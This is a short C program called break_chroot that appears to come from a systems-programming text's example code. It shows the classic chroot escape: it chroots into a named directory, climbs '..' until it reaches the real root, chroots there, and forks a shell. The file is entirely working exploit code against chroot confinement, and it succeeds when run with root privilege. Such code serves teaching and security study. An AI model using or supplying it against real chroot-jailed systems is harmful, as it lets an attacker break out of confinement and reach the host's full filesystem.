#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include "ssp.h"

int main (int argc, char **argv)
{
	struct stat buf1;
	struct stat buf2;

	if (argc != 2)
		err_quit ("Usage: break_chroot directory");

	if (chdir ("/") == -1)
		err_msg ("Can't chdir to /");

	if (chroot (argv [1]) == -1)
		err_msg ("Can't chroot to %s", argv [1]);

	for (;;) {
		if (stat (".", &buf1) == -1)
			err_msg ("Can't stat .");
		if (stat ("..", &buf2) == -1)
			err_msg ("Can't stat ..");

		if ((buf1.st_dev == buf2.st_dev) && (buf1.st_ino == buf2.st_ino))
			break;

		if (chdir ("..") == -1)
			err_msg ("Can't chdir to ..");
	}

	chroot (".");

	switch (fork ()) {
		case -1:
			err_msg ("Can't fork");
			break;

		case 0:
			execl ("/sbin/sh", "-sh", NULL);
			execl ("/bin/sh", "-sh", NULL);
			printf ("Can't find a shell - exiting.\n");
			_exit (0);

		default:
			break;
	}

	return (0);
}
